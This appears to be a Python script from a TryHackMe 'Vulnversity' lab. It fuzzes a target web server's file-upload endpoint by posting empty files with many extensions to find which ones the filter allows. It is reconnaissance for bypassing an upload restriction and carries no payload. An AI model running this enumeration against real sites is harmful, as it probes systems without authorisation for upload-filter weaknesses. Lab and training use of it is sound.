import requests
import os
import shutil


dirWithFiles = "/home/kali/Documents/tryhackme/vulnversity/python_extension_script"
fileExtensions = "extensions.txt"

host = "10.10.187.230"
port = "3333"
# endpoint = "/internal/index.php"
url=f'http://{host}:{port}/internal/index.php'


os.mkdir(os.path.join(dirWithFiles, "files_with_extensions"), mode=0o777)

with open(fileExtensions, "r") as f:
    os.chdir(dirWithFiles+"/files_with_extensions")
    lines = f.read().splitlines()
    for line in lines:
        filename = "teste" + line
        fExt = open(filename, "x")
        fExt.close()
        files = {'file': (filename, open(filename, 'rb'),'text/csv')}
        response = requests.post(url, files=files)
        if "Extension not allowed" in response.text:
            print(f"format {line} not allowed")
        else:
            print(f"format {line} allowed :D")

os.chdir(dirWithFiles)
shutil.rmtree(dirWithFiles+"/files_with_extensions")
